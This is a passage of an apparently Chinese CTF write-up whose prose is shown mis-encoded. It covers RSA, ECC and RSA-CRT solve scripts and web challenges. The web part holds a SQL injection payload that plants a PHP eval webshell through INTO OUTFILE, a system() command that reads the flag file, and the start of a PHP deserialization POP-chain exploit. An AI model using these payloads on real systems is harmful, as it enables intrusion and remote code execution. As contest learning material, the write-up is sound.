</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;q ä¸æ˜¯ç´ æ•°ï¼Œæ£€æŸ¥è¾“å…¥&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;æ‰¾åˆ° q: </span><span style=color:#e6db74>{</span>q<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    phi_n <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    d <span style=color:#f92672>=</span> inverse(e, phi_n)
</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;flag =&#34;</span>, flag)
</span></span></code></pre></div><h1 id=week5>week5</h1><h2 id=crypto-4>crypto</h2><h3 id=rsacmd5>RSAï¼Ÿcmd5ï¼</h3><p>å¾—åˆ°çš„MD5å€¼å»cmd5çš„ç½‘å€å¯ä»¥ç›´æ¥å‡ºï¼Œç„¶åç»§ç»­è§£å¯†å³å¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> gmpy2 <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># ç»™å®šçš„å¯†æ–‡å’Œç­¾å</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>119084320846787611587774426118526847905825678869032529318497425064970463356147909835330423466179802531093233559613714033492951177656433798856482195873924140269461792479008703758436687940228268475598134411304167494814557384094637387369282900460926092035234233538644197114822992825439656673482850515654334379332</span>
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> <span style=color:#ae81ff>5461514893126669960233658468203682813465911805334274462134892270260355037191167357098405392972668890146716863374229152116784218921275571185229135409696720018765930919309887205786492284716906060670649040459662723215737124829497658722113929054827469554157634284671989682162929417551313954916635460603628116503</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>139458221347981983099030378716991183653410063401398496859351212711302933950230621243347114295539950275542983665063430931475751013491128583801570410029527087462464558398730501041018349125941967135719526654701663270142483830687281477000567117071676521061576952568958398421029292366101543468414270793284704549051</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_MD5</span>(m0):
</span></span><span style=display:flex><span>    md5_object <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(m0<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    md5_result <span style=color:#f92672>=</span> md5_object<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> md5_result
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_s</span>(m0, d0, n0):
</span></span><span style=display:flex><span>    hm0 <span style=color:#f92672>=</span> get_MD5(m0)
</span></span><span style=display:flex><span>    hm1 <span style=color:#f92672>=</span> bytes_to_long(hm0<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    s0 <span style=color:#f92672>=</span> pow(hm1, d0, n0)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rsa_encode</span>(m0, e0, n0):
</span></span><span style=display:flex><span>    m1 <span style=color:#f92672>=</span> bytes_to_long(m0<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    c0 <span style=color:#f92672>=</span> pow(m1, e0, n0)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> c0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_flag</span>(m0):
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;flag{th1s_1s_my_k3y:&#39;</span> <span style=color:#f92672>+</span> m0 <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;0x&#39;</span> <span style=color:#f92672>+</span> hashlib<span style=color:#f92672>.</span>sha256(m0<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;}&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flag
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>recover_message_from_signature</span>():
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;é€šè¿‡ç­¾åæ¢å¤MD5å€¼&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    recovered_md5_int <span style=color:#f92672>=</span> pow(s, e, n)
</span></span><span style=display:flex><span>    recovered_md5 <span style=color:#f92672>=</span> long_to_bytes(recovered_md5_int)<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Recovered MD5: </span><span style=color:#e6db74>{</span>recovered_md5<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> recovered_md5
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>verify_message</span>(message):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;éªŒè¯æ¶ˆæ¯çš„æ­£ç¡®æ€§&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># éªŒè¯MD5</span>
</span></span><span style=display:flex><span>    calculated_md5 <span style=color:#f92672>=</span> get_MD5(message)
</span></span><span style=display:flex><span>    recovered_md5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;86133884de98baada58a8c4de66e15b8&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Verification results:&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Message: </span><span style=color:#e6db74>{</span>message<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Calculated MD5: </span><span style=color:#e6db74>{</span>calculated_md5<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Expected MD5:   </span><span style=color:#e6db74>{</span>recovered_md5<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;MD5 Match: </span><span style=color:#e6db74>{</span>calculated_md5 <span style=color:#f92672>==</span> recovered_md5<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># è®¡ç®—ç­¾åéªŒè¯</span>
</span></span><span style=display:flex><span>    hm1 <span style=color:#f92672>=</span> bytes_to_long(calculated_md5<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    verify_result <span style=color:#f92672>=</span> pow(s, e, n)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Signature verification: </span><span style=color:#e6db74>{</span>verify_result <span style=color:#f92672>==</span> hm1<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> calculated_md5 <span style=color:#f92672>==</span> recovered_md5
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># Step 1: ä»ç­¾åä¸­æ¢å¤MD5</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Step 1: Recovering MD5 from signature...&#34;</span>)
</span></span><span style=display:flex><span>    recovered_md5 <span style=color:#f92672>=</span> recover_message_from_signature()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Step 2: æˆ‘ä»¬å·²çŸ¥æ¶ˆæ¯æ˜¯ &#34;adm0n12&#34;</span>
</span></span><span style=display:flex><span>    message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;adm0n12&#34;</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 2: Using known message: </span><span style=color:#e6db74>{</span>message<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Step 3: éªŒè¯æ¶ˆæ¯</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 3: Verifying message...&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> verify_message(message):
</span></span><span style=display:flex><span>        <span style=color:#75715e># Step 4: ç”Ÿæˆflag</span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 4: Generating flag...&#34;</span>)
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>=</span> get_flag(message)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Final Flag:&#34;</span>)
</span></span><span style=display:flex><span>        print(flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># Step 5: é¢å¤–éªŒè¯ - æ£€æŸ¥å¯†æ–‡</span>
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Step 5: Additional verification...&#34;</span>)
</span></span><span style=display:flex><span>        test_c <span style=color:#f92672>=</span> rsa_encode(flag, e, n)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Ciphertext match: </span><span style=color:#e6db74>{</span>test_c <span style=color:#f92672>==</span> c<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Message verification failed!&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><h3 id=easy_ecc>easy_ecc</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sage.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span> <span style=color:#75715e># type: ignore</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Given parameters</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>64408890408990977312449920805352688472706861581336743385477748208693864804529</span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> <span style=color:#ae81ff>111430905433526442875199303277188510507615671079377406541731212384727808735043</span>
</span></span><span style=display:flex><span>b <span style=color:#f92672>=</span> <span style=color:#ae81ff>89198454229925288228295769729512965517404638795380570071386449796440992672131</span>
</span></span><span style=display:flex><span>k <span style=color:#f92672>=</span> <span style=color:#ae81ff>86388708736702446338970388622357740462258632504448854088010402300997950626097</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Given ciphertext points</span>
</span></span><span style=display:flex><span>c1_x <span style=color:#f92672>=</span> <span style=color:#ae81ff>10968743933204598092696133780775439201414778610710138014434989682840359444219</span>
</span></span><span style=display:flex><span>c1_y <span style=color:#f92672>=</span> <span style=color:#ae81ff>50103014985350991132553587845849427708725164924911977563743169106436852927878</span>
</span></span><span style=display:flex><span>c2_x <span style=color:#f92672>=</span> <span style=color:#ae81ff>16867464324078683910705186791465451317548022113044260821414766837123655851895</span>
</span></span><span style=display:flex><span>c2_y <span style=color:#f92672>=</span> <span style=color:#ae81ff>35017929439600128416871870160299373917483006878637442291141472473285240957511</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Given encrypted message parts</span>
</span></span><span style=display:flex><span>c_left <span style=color:#f92672>=</span> <span style=color:#ae81ff>15994601655318787407246474983001154806876869424718464381078733967623659362582</span>
</span></span><span style=display:flex><span>c_right <span style=color:#f92672>=</span> <span style=color:#ae81ff>3289163848384516328785319206783144958342012136997423465408554351179699716569</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Initialize the elliptic curve</span>
</span></span><span style=display:flex><span>E <span style=color:#f92672>=</span> EllipticCurve(GF(p), [a,b])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Convert points to curve points</span>
</span></span><span style=display:flex><span>C1 <span style=color:#f92672>=</span> E(c1_x, c1_y)
</span></span><span style=display:flex><span>C2 <span style=color:#f92672>=</span> E(c2_x, c2_y)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Decrypt the message point</span>
</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> C1 <span style=color:#f92672>-</span> k<span style=color:#f92672>*</span>C2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Get the original message coordinates</span>
</span></span><span style=display:flex><span>m_x <span style=color:#f92672>=</span> M[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>m_y <span style=color:#f92672>=</span> M[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Convert to GF(p) elements</span>
</span></span><span style=display:flex><span>F <span style=color:#f92672>=</span> GF(p)
</span></span><span style=display:flex><span>m_x <span style=color:#f92672>=</span> F(m_x)
</span></span><span style=display:flex><span>m_y <span style=color:#f92672>=</span> F(m_y)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Calculate multiplicative inverse</span>
</span></span><span style=display:flex><span>m_x_inv <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>m_x
</span></span><span style=display:flex><span>m_y_inv <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>m_y
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Recover the flag parts using multiplicative inverse</span>
</span></span><span style=display:flex><span>flag_left <span style=color:#f92672>=</span> c_left <span style=color:#f92672>*</span> m_x_inv
</span></span><span style=display:flex><span>flag_right <span style=color:#f92672>=</span> c_right <span style=color:#f92672>*</span> m_y_inv
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Convert to bytes</span>
</span></span><span style=display:flex><span>flag_left <span style=color:#f92672>=</span> long_to_bytes(int(flag_left))
</span></span><span style=display:flex><span>flag_right <span style=color:#f92672>=</span> long_to_bytes(int(flag_right))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Print the result</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Recovered flag:&#34;</span>, flag_left <span style=color:#f92672>+</span> flag_right)
</span></span></code></pre></div><h3 id=æ²¡eä¹Ÿèƒ½ç©>æ²¡eä¹Ÿèƒ½ç©</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> gmpy2 <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve_rsa_crt</span>(c, p, q, dp, dq):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Calculate q_inv = q^(-1) mod p</span>
</span></span><span style=display:flex><span>    q_inv <span style=color:#f92672>=</span> int(invert(q, p))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Calculate message parts using CRT</span>
</span></span><span style=display:flex><span>    m1 <span style=color:#f92672>=</span> pow(c, dp, p)
</span></span><span style=display:flex><span>    m2 <span style=color:#f92672>=</span> pow(c, dq, q)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Use CRT to combine results</span>
</span></span><span style=display:flex><span>    h <span style=color:#f92672>=</span> (q_inv <span style=color:#f92672>*</span> (m1 <span style=color:#f92672>-</span> m2)) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>    m <span style=color:#f92672>=</span> m2 <span style=color:#f92672>+</span> h <span style=color:#f92672>*</span> q
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> m
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Given values</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>312026920216195772014255984174463085443866592575942633449581804171108045852080517840578408476885673600123673447592477875543106559822653280458539889975125069364584140981069913341705738633426978886491359036285144974311751490792757751756044409664421663980721578870582548395096887840688928684149014816557276765747135567714257184475027270111822159712532338590457693333403200971556224662094381891648467959054115723744963414673861964744567056823925630723343002325605154661959863849738333074326769879861280895388423162444746726568892877802824353858845944856881876742211956986853244518521508714633279380808950337611574412909</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>108043725609186781791705090463399988837848128384507136697546885182257613493145758848215714322999196482303958182639388180063206708575175264502030010971971799850889123915580518613554382722069874295016841596099030496486069157061211091761273568631799006187376088457421848367280401857536410610375012371577177832001</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> <span style=color:#ae81ff>121590551121540247114817509966135120751936084528211093275386628666641298457070126234836053337681325952068673362753408092990553364818851439157868686131416391201519794244659155411228907897025948436021990520853498462677797392855335364006924106615008646396883330251028071418465977013680888333091554558623089051503</span>
</span></span><span style=display:flex><span>dp <span style=color:#f92672>=</span> <span style=color:#ae81ff>11282958604593959665264348980446305500804623200078838572989469798546944577064705030092746827389207634235443944672230537015008113180165395276742807804632116181385860873677969229460704569172318227491268503039531329141563655811632035522134920788501646372986281785901019732756566066694831838769040155501078857473</span>
</span></span><span style=display:flex><span>dq <span style=color:#f92672>=</span> <span style=color:#ae81ff>46575357360806054039250786123714177813397065260787208532360436486982363496441528434309234218672688812437737096579970959403617066243685956461527617935564293219447837324227893212131933165188205281564552085623483305721400518031651417947568896538797580895484369480168587284879837144688420597737619751280559493857</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Solve and convert result to text</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> solve_rsa_crt(c, p, q, dp, dq)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Decrypted flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#f92672>.</span>decode()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h2 id=web-4>web</h2><h3 id=sqlshellå¤ç°>sqlshell(å¤ç°)</h3><p>æ²¡æƒ³åˆ°ç›´æ¥è¿™ä¹ˆå†™orz</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>alice<span style=color:#e6db74>&#39; union select 1,&#39;</span>&lt;?php eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span>1<span style=color:#f92672>])</span>;?&gt;<span style=color:#e6db74>&#39;,3 INTO OUTFILE &#39;</span>/var/www/html/orange.php<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#75715e>#</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>1<span style=color:#f92672>=</span>system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;cat /you_cannot_read_the_flag_directly&#39;</span><span style=color:#f92672>)</span>;
</span></span></code></pre></div><h3 id=è‡­çš®å¹æ³¡æ³¡å¤ç°>è‡­çš®å¹æ³¡æ³¡(å¤ç°)</h3><p>å¥½é•¿çš„popé“¾å½“æ—¶æœ‰å…¶ä»–æ¯”èµ›è‡ªå·±ä¹Ÿæ²¡ç»†çœ‹ï¼Œè·Ÿç€å­¦å­¦å§</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>study</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $study;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>study</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;happy&#34;</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>study</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ctf</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $ctf;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__tostring</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>ctf</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;phpinfo&#34;</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;u can&#39;t do this!!!!!!!&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>ctf</span>)(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;can can need&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>let_me</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $let_me;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $time;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_flag</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $runcode<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;?php #&#34;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>let_me</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;?&gt;&#34;</span>;
</span></span><span style=display:flex><span>        $tmpfile<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;code.php&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>file_put_contents</span>($tmpfile,$runcode);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> (<span style=color:#e6db74>&#34;we need more&#34;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>time</span>);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>unlink</span>($tmpfile);
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>Exception</span> $e){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;no!&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;study ctf let me happy&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>happy</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $sign_in;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sign in &#34;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sign_in</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34; here&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $str;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$signin <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;new_star[ctf&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($signin) {
</span></span><span style=display:flex><span>    $signin <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>($signin);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>unserialize</span>($signin);
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;ä½ æ˜¯çœŸæ­£çš„CTF New Star å—ï¼Ÿ è®©æˆ‘çœ‹çœ‹ä½ çš„èƒ½åŠ›&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>å…ˆè®²ä¸€ä¸‹é‡ç”Ÿwpçš„</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$exp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>happy</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sign_in</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ctf</span>;
